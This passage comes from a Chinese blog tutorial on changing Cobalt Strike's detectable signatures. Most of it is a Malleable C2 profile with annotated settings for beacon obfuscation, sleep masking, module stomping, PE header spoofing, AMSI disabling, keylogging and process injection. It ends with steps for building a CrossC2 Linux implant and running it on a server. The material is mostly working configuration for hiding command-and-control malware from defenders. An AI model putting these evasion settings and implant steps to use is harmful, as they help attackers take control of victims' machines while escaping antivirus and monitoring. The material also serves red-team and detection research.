<span class="comment"># 要求反射加载器在加载Beacon有效载荷后覆盖MZ(Microsoft Windows Portable Executable File)头、PE头和e_lfanew值,</span></span><br><span class="line">    <span class="built_in">set</span> obfuscate      <span class="string">&quot;true&quot;</span>; <span class="comment">#  obfuscate启用对反射DLL的导入表进行混淆,覆盖未使用的头部内容,并要求反射加载器在没有DLL头的情况下将Beacon复制到新内存中. 混淆的不是真正的恶意代码</span></span><br><span class="line">    <span class="built_in">set</span> cleanup        <span class="string">&quot;true&quot;</span>; <span class="comment"># 当我们得到真正的 Beacon 时前面两段内存会被清理掉</span></span><br><span class="line">    <span class="comment"># CS 3.12 Addition &quot;Obfuscate and Sleep&quot;</span></span><br><span class="line">    <span class="built_in">set</span> sleep_mask     <span class="string">&quot;true&quot;</span>; <span class="comment">#  比如当执行截图操作时，我们的命令指令是存储在第三块内存中的，所以我们在休眠时也容易被侦测到。当设置为true时，休眠状态下我们的命令指令就会被加密，不容易被识别。当然这也存在一块可以解密的代码，当睡眠过后又会根据该代码将加密内容解开，正常执行命令。</span></span><br><span class="line">    <span class="comment"># CS 4.1  </span></span><br><span class="line">    <span class="built_in">set</span> smartinject    <span class="string">&quot;true&quot;</span>; <span class="comment"># 内存侦测技术:在执行写入到内存的shellcode代码时，而shellcode就是一些与位置无关的代码，想要执行这些功能代码就要去寻找一些相应的API函数的位置，正常情况下是每次使用都要遍历出Kernel32 DLL 在内存中的位置。再找到相应函数的一个指针，通过指针调用相应函数执行相应功能。而这遍历的功能就被作为检测的特征了。当“smartinject”设置为true时，就不会每次都调用去遍历Kernel32 DLL了，在第一次遍历时就将函数的指针找到给下面所有需要调用的地方</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Make the Beacon Reflective DLL look like something else in memory</span></span><br><span class="line">    <span class="comment"># Values captured using peclone agaist a Windows 10 version of explorer.exe</span></span><br><span class="line">    <span class="built_in">set</span> checksum       <span class="string">&quot;0&quot;</span>; <span class="comment"># 设置Beacon的PE头部中的校验和值,</span></span><br><span class="line">    <span class="built_in">set</span> compile_time   <span class="string">&quot;11 Nov 2016 04:08:32&quot;</span>; <span class="comment"># 设置Beacon的PE头部中的编译时间</span></span><br><span class="line">    <span class="built_in">set</span> entry_point    <span class="string">&quot;650688&quot;</span>; <span class="comment"># 设置Beacon的PE头部中的入口点值</span></span><br><span class="line">    <span class="built_in">set</span> image_size_x86 <span class="string">&quot;4661248&quot;</span>;</span><br><span class="line">    <span class="built_in">set</span> image_size_x64 <span class="string">&quot;4661248&quot;</span>;</span><br><span class="line">    <span class="built_in">set</span> name           <span class="string">&quot;srv.dll&quot;</span>;</span><br><span class="line">    <span class="built_in">set</span> rich_header    <span class="string">&quot;\xbf\x7c\x40\x4a\x9c\x8e\xe1\xdd\x29\xce\x77\x1e\x1c\xee\x41\xab\x9d\xa8\xf5\x65\xec\xde\x71\x7b\xa6\x3f\xb8\x1c\x5c\x70\xaa\xd6\xca\x84\xd1\xc6\x2d\xad\x7c\xfe\x30\x6c\x1b\x98\x91\x6c\x63\xba\x03\x83\xbf\x4e\xbb\xe4\x33\xba\x01\xb3\xab\xf6\x01\x99\x13\x71&quot;</span>;  <span class="comment"># 添加到DLL中的元信息数据</span></span><br><span class="line"></span><br><span class="line">   <span class="comment">##：模块踩踏</span></span><br><span class="line">   <span class="comment"># Cobalt Strike 3.11还在Beacon的反射加载器中添加了模块踩踏功能。启用后，Beacon的加载程序将避开VirtualAlloc，而是将一个DLC加载到当前进程中并覆盖其内存。</span></span><br><span class="line">  </span><br><span class="line">   <span class="comment"># 将module_x86设置为最喜欢的x86 DLC，以模块踩踏x86 Beacon。module_x64选项为x64 Beacon启用此功能。</span></span><br><span class="line">   <span class="comment"># 虽然这是一个强大的功能，但也需要注意！如果您加载的库不够大，无法托管Beacon，您将导致Beacon的进程崩溃。如果当前进程稍后加载相同的库（无论出于何种原因），您将使Beacon的进程崩溃。仔细选择。</span></span><br><span class="line">   <span class="comment"># 默认情况下，Beacon的加载程序使用VirtualAlloc分配内存。模块踩踏是一种替代方案。将module_x86设置为大约是Beacon有效负载本身两倍大的DLC。Beacon的x86加载程序将加载指定的DLC，找到其在内存中的位置并覆盖它。这是在Windows与磁盘上的文件关联的内存中初始化Beacon的一种方法。重要的是，您要驻留的应用程序不需要您选择的DLC。module_x64选项是同样的情况，但它会影响x64 Beacon。</span></span><br><span class="line">   <span class="comment"># 详细信息请参阅In-memorial Evasion视频系列。https://youtu.be/uWVH9l2GMw4</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># set module_x64 &quot;netshell.dll&quot;;</span></span><br><span class="line">    <span class="comment"># set module_x86 &quot;netshell.dll&quot;;</span></span><br><span class="line">	<span class="comment"># 启动一个正常的 DLL，把一个 DLL 映射到内存中间的时候，这是一个正常的映射流程，然而最后一步反射 DLL Loader 不是直接分配内存，他是在申请完新内存后再把这块内存替换成我们真正的 Beacon 内容</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	 <span class="comment"># transform-x86和transform-x64块填充和转换Beacon的反射性动态链接库阶段。这些块支持三个命令：prepend、append和strsup。</span></span><br><span class="line">     <span class="comment"># 填充和转换Beacon的反射DLL阶段</span></span><br><span class="line">    transform-x86 &#123; <span class="comment"># transform the x86 rDLL stage</span></span><br><span class="line">        prepend <span class="string">&quot;\x66\x90\x47\x4c\x40\x0f\x1f\x00\x0f\x1f\x04\x00\x40\x66\x87\xdb\x49\x44\x0f\x1f\x00\x42\x66\x87\xd2\x87\xc9\x66\x0f\x1f\x04\x00\x43\x87\xdb\x45\x87\xd2\x41\x48\x66\x87\xc9\x0f\x1f\x00\x46\x90&quot;</span>; <span class="comment"># 前置</span></span><br><span class="line">        strrep <span class="string">&quot;ReflectiveLoader&quot;</span> <span class="string">&quot;execute&quot;</span>; <span class="comment"># 字符串替换</span></span><br><span class="line">        strrep <span class="string">&quot;This program cannot be run in DOS mode&quot;</span> <span class="string">&quot;&quot;</span>; <span class="comment"># Remove this text</span></span><br><span class="line">        strrep <span class="string">&quot;beacon.dll&quot;</span> <span class="string">&quot;&quot;</span>; <span class="comment"># Remove this text</span></span><br><span class="line">    &#125;</span><br><span class="line">    transform-x64 &#123; <span class="comment"># transform the x64 rDLL stage</span></span><br><span class="line">        prepend <span class="string">&quot;\x66\x90\x47\x4c\x40\x0f\x1f\x00\x0f\x1f\x04\x00\x40\x66\x87\xdb\x49\x44\x0f\x1f\x00\x42\x66\x87\xd2\x87\xc9\x66\x0f\x1f\x04\x00\x43\x87\xdb\x45\x87\xd2\x41\x48\x66\x87\xc9\x0f\x1f\x00\x46\x90&quot;</span>; <span class="comment"># prepend nops</span></span><br><span class="line">        strrep <span class="string">&quot;ReflectiveLoader&quot;</span> <span class="string">&quot;execute&quot;</span>; <span class="comment"># Change this text in the Beacon DLL</span></span><br><span class="line">        strrep <span class="string">&quot;beacon.x64.dll&quot;</span> <span class="string">&quot;&quot;</span>; <span class="comment"># Remove this text in the Beacon DLL</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    stringw <span class="string">&quot;jQuery&quot;</span>; <span class="comment"># stringw用于将字符串&quot;JQuery&quot;添加到DLL中,是为了使DLL看起来更像正常的JavaScript库文件,从而减少被检测的可能性</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="Post-Ex"><a href="#Post-Ex" class="headerlink" title="Post-Ex"></a>Post-Ex</h4><p>我们在执行截屏时不是直接在 Beacon 中执行的，而是起了一个傀儡进程，在傀儡进程中执行，再用命名管道将数据回传回来。</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202409261130985.png" data-fancybox="true"/></div></div>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">post-ex &#123;</span><br><span class="line">        <span class="comment"># 指定了32位Beacon在执行后渗透(post-exploitation)任务时注入shellcode的目标程序路径</span></span><br><span class="line">        <span class="built_in">set</span> spawnto_x86 <span class="string">&quot;%windir%\\syswow64\\WerFault.exe&quot;</span>;</span><br><span class="line">        <span class="built_in">set</span> spawnto_x64 <span class="string">&quot;%windir%\\sysnative\\WerFault.exe&quot;</span>;</span><br><span class="line">        <span class="comment"># 启用对后渗透DLL的混淆</span></span><br><span class="line">        <span class="built_in">set</span> obfuscate <span class="string">&quot;true&quot;</span>;</span><br><span class="line">        <span class="comment"># 启用智能注入功能</span></span><br><span class="line">        <span class="built_in">set</span> smartinject <span class="string">&quot;true&quot;</span>;</span><br><span class="line">        <span class="comment"># 禁用AMSI</span></span><br><span class="line">        <span class="built_in">set</span> amsi_disable <span class="string">&quot;true&quot;</span>;</span><br><span class="line">        <span class="comment"># 定义了用于后渗透任务的命名管道名称,</span></span><br><span class="line">        <span class="built_in">set</span> pipename <span class="string">&quot;Winsock2\\CatalogChangeListener-###-0,&quot;</span>;</span><br><span class="line">        <span class="comment"># 设置键盘记录使用的函数</span></span><br><span class="line">        <span class="built_in">set</span> keylogger <span class="string">&quot;GetAsyncKeyState&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="Process-Inject"><a href="#Process-Inject" class="headerlink" title="Process-Inject"></a>Process-Inject</h4><p>进程注入自定义的参数</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">process-inject &#123;</span><br><span class="line">    <span class="built_in">set</span> allocator <span class="string">&quot;NtMapViewOfSection&quot;</span>;  <span class="comment"># 设置远程进程中内存分配的方法为 NtMapViewOfSection</span></span><br><span class="line">    <span class="built_in">set</span> min_alloc <span class="string">&quot;17500&quot;</span>; <span class="comment"># 注入内容的最小内存分配大小</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># Set memory permissions as permissions as initial=RWX, final=RX</span></span><br><span class="line">    <span class="built_in">set</span> startrwx <span class="string">&quot;false&quot;</span>; <span class="comment"># 注入内容的初始内存权限,False意味着不是读写执行</span></span><br><span class="line">    <span class="built_in">set</span> userwx   <span class="string">&quot;false&quot;</span>; <span class="comment"># 最终内存权限</span></span><br><span class="line">    transform-x86 &#123;</span><br><span class="line">        prepend <span class="string">&quot;\x66\x90\x47\x4c\x40\x0f\x1f\x00\x0f\x1f\x04\x00\x40\x66\x87\xdb\x49\x44\x0f\x1f\x00\x42\x66\x87\xd2\x87\xc9\x66\x0f\x1f\x04\x00\x43\x87\xdb\x45\x87\xd2\x41\x48\x66\x87\xc9\x0f\x1f\x00\x46\x90&quot;</span>; <span class="comment"># 在注入内容前添加NOP滑梯(\x90\x90是NOP指令的机器码)</span></span><br><span class="line">        <span class="comment">#append &quot;\x90\x90&quot;;</span></span><br><span class="line">    &#125;</span><br><span class="line">    transform-x64 &#123;</span><br><span class="line">        prepend <span class="string">&quot;\x66\x90\x47\x4c\x40\x0f\x1f\x00\x0f\x1f\x04\x00\x40\x66\x87\xdb\x49\x44\x0f\x1f\x00\x42\x66\x87\xd2\x87\xc9\x66\x0f\x1f\x04\x00\x43\x87\xdb\x45\x87\xd2\x41\x48\x66\x87\xc9\x0f\x1f\x00\x46\x90&quot;</span>;</span><br><span class="line">        <span class="comment">#append &quot;\x90\x90&quot;;</span></span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">    execute &#123;</span><br><span class="line">        CreateThread <span class="string">&quot;ntdll!RtlUserThreadStart+0x42&quot;</span>; <span class="comment"># 使用CreateThread函数创建一个线程,并使用特定的偏移量(+0x42)作为线程的入口点,这通常用于当前进程的自我注入</span></span><br><span class="line">        CreateThread; <span class="comment"># 这是一个通用的CreateThread方法,他尝试创建一个线程而不指定特定的入口点</span></span><br><span class="line">        NtQueueApcThread-s; <span class="comment"># 这个方法使用APC(异步过程调用)线程注入技术,-s表示这是一个&quot;Stealth&quot;版本的APC注入,可能更难以被检测</span></span><br><span class="line">        CreateRemoteThread; <span class="comment"># 这个方法尝试跨进程创建远程线程,这是一种常见的跨进程注入技术</span></span><br><span class="line">        RtlCreateUserThread;  <span class="comment"># 这个方法使用RtlCreateUserThread函数进行注入,它支持所有架构依赖的情况,例如32位到64位的注入,并且可以跨会话边界进行注入</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="Prepend"><a href="#Prepend" class="headerlink" title="Prepend"></a>Prepend</h4><p><code>prepend.py</code>是一个Python脚本,它生成动态垃圾<code>shellcode</code>,该<code>shellcode</code>将附加在实际<code>shellcode</code>的开头.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python3 prepend.py </span><br><span class="line"></span><br><span class="line">\x66\x90\x47\x4c\x40\x0f\x1f\x00\x0f\x1f\x04\x00\x40\x66\x87\xdb\x49\x44\x0f\x1f\x00\x42\x66\x87\xd2\x87\xc9\x66\x0f\x1f\x04\x00\x43\x87\xdb\x45\x87\xd2\x41\x48\x66\x87\xc9\x0f\x1f\x00\x46\x90</span><br></pre></td></tr></table></figure>
+
+<p>复制输出并将其粘贴到配置文件中(在<code>transform-x64</code>或<code>transform-x86</code>块内)</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">transform-x64 &#123;</span><br><span class="line"> ...</span><br><span class="line"> prepend </span><br><span class="line"><span class="string">&quot;\x66\x90\x47\x4c\x40\x0f\x1f\x00\x0f\x1f\x04\x00\x40\x66\x87\xdb\x49\x44\x0f\x1f\x00\x42\x66\x87\xd2\x87\xc9\x66\x0f\x1f\x04\x00\x43\x87\xdb\x45\x87\xd2\x41\x48\x66\x87\xc9\x0f\x1f\x00\x46\x90&quot;</span>;</span><br><span class="line"> ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202409251727210.png" data-fancybox="true"/></div></div>
+
+<h4 id="Rich-Header"><a href="#Rich-Header" class="headerlink" title="Rich_Header"></a>Rich_Header</h4><p><code>rich_header</code>生成动态<code>shellcode</code>,负责编译器插入的元信息.<code>Rich</code>标头是一个PE部分,用作Windows可执行文件生成环境的指纹.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python3 rich_header.py</span><br><span class="line"></span><br><span class="line">\xbf\x7c\x40\x4a\x9c\x8e\xe1\xdd\x29\xce\x77\x1e\x1c\xee\x41\xab\x9d\xa8\xf5\x65\xec\xde\x71\x7b\xa6\x3f\xb8\x1c\x5c\x70\xaa\xd6\xca\x84\xd1\xc6\x2d\xad\x7c\xfe\x30\x6c\x1b\x98\x91\x6c\x63\xba\x03\x83\xbf\x4e\xbb\xe4\x33\xba\x01\xb3\xab\xf6\x01\x99\x13\x71</span><br></pre></td></tr></table></figure>
+
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202409251727323.png" data-fancybox="true"/></div></div>
+
+<h3 id="检查profile文件"><a href="#检查profile文件" class="headerlink" title="检查profile文件"></a>检查profile文件</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">chmod</span> +x c2lint </span><br><span class="line">./c2lint jquery-c2.4.5-jx.profile</span><br></pre></td></tr></table></figure>
+
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202409251727420.png" data-fancybox="true"/></div></div>
+
+<p>使用profile文件启动cs:<code>./teamserver 83.***.***.145 123456 jquery-c2.4.5-jx.profile</code></p>
+<h2 id="CS配置linux上线"><a href="#CS配置linux上线" class="headerlink" title="CS配置linux上线"></a>CS配置linux上线</h2><h3 id="下载-CrossC2"><a href="#下载-CrossC2" class="headerlink" title="下载 CrossC2"></a>下载 CrossC2</h3><p>cs默认是不支持上线linux主机的 , 但是可以通过安装<a target="_blank" rel="noopener" href="https://github.com/gloxec/CrossC2/releases">CrossC2</a>插件实现,但也只支持<code>HTTPS beacon</code></p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202409251727093.png" data-fancybox="true"/></div></div>
+
+<p>将以上三个文件下载到cs安装目录下的<code>script</code>目录中,并进行解压</p>
+<h3 id="安装插件"><a href="#安装插件" class="headerlink" title="安装插件"></a><strong>安装插件</strong></h3><p>复制cs服务端目录下的<code>.cobaltstrike.beacon_keys</code>到<code>genCrossC2.Win.exe</code>所在的目录下</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202409251727300.png" data-fancybox="true"/></div></div>
+
+<p>然后编辑<code>CrossC2-GithubBot-2021-11-02.cna</code>文件,填入相关路径<strong>Windows下双斜杠</strong></p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202409251727890.png" data-fancybox="true"/></div></div>
+
+<p>启动<code>cs</code>,使用客户端加载<code>cna</code>插件.选择<code>Script Manager</code>,添加<code>CrossC2.cna</code></p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202409251727483.png" data-fancybox="true"/></div></div>
+
+<p>如果成功安装,菜单栏会多出一项<code>CrossC2</code></p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202409251728955.png" data-fancybox="true"/></div></div>
+
+<h3 id="上线测试"><a href="#上线测试" class="headerlink" title="上线测试"></a>上线测试</h3><p>将服务端的<code>jquery-c2.4.5-jx.profile</code>文件保存到cs目录,然后新建一个https的监听</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202409251728750.png" data-fancybox="true"/></div></div>
+
+<p>选择<code>CrossC2</code>—&gt;<code>Create CrossC2 Listener</code>—&gt;<code>Create Reverse HTTPS Listener</code></p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202409251728711.png" data-fancybox="true"/></div></div>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">host beacon port  <span class="comment"># 可以更改,未被占用即可</span></span><br><span class="line">Choose:c2profile  <span class="comment"># 选择从服务器上下载下来的jquery-c2.4.5-jx.profile文件</span></span><br><span class="line">Listener:         <span class="comment"># 选择HTTPS的监听器</span></span><br><span class="line">OutPutFileName    <span class="comment"># 木马文件名</span></span><br></pre></td></tr></table></figure>
+
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202409251728208.png" data-fancybox="true"/></div></div>
+
+<p>生成的木马在CS目录下,上传到Linux服务器并后台运行</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202409251728680.png" data-fancybox="true"/></div></div>
+
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202409251728502.png" data-fancybox="true"/></div></div>
+
+<div class="article-footer fs14">
+    <section id="references">
+      <div class="header"><span>参考资料</span></div>
+      <div class="body">
+        <ul>
+        <li class="post-title">
+          <p><a target="_blank" rel="noopener" href="https://www.cobaltstrike.com/product/features/malleable-c2">Malleable Command and Control</a></p>
+
+        </li>
+        
+        <li class="post-title">
+          <p><a target="_blank" rel="noopener" href="https://github.com/rsmudge/Malleable-C2-Profiles">Malleable-C2-Profiles</a></p>
+
+        </li>
+        </ul>
+      </div>
+    </section>
+    
+    <section id="license">
+      <div class="header"><span>许可协议</span></div>
+      <div class="body"><p>本文由 <a href="https://jiangjiyue.github.io/">kill3r</a> 原创,采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">署名-非商业性使用-相同方式共享 4.0 国际</a> 许可协议，转载请注明出处。</p>
+</div>
+    </section>
+    
+    <section id="share">
+      <div class="header"><span>分享文章</span></div>
+      <div class="body">
+        <div class="link"><input class="copy-area" readonly="true" id="copy-link" value="https://jiangjiyue.github.io/2024/09/25/3c3f9499/" /></div>
+        <div class="social-wrap dis-select"><a class="social share-item wechat" onclick="util.toggle(&quot;qrcode-wechat&quot)"><img class="lazy"  src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/social/b32ef3da1162a.svg" /></a><a class="social share-item weibo" target="_blank" rel="external nofollow noopener noreferrer" href="https://service.weibo.com/share/share.php?url=https://jiangjiyue.github.io/2024/09/25/3c3f9499/&title=CS-Cobalt Strike修改特征 - SafeKiller Zone&pics=https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202409251732512.png&summary=
+    总字符数: 38.95K 
+    
+    
+    代码: 34.06K, 文本: 2.08K
+    
+    
+    预计阅读时间: 2.62 小时
+    
+    
+
+什么是特征特征 : 人或事物可供识别的特殊..."><img class="lazy"  src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/social/80c07e4dbb303.svg" /></a><a class="social share-item email" href="mailto:?subject=CS-Cobalt Strike修改特征 - SafeKiller Zone&amp;body=https://jiangjiyue.github.io/2024/09/25/3c3f9499/"><img class="lazy"  src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/social/a1b00e20f425d.svg" /></a><a class="social share-item link" onclick="util.copy(&quot;copy-link&quot;, &quot;复制成功&quot;)"><img 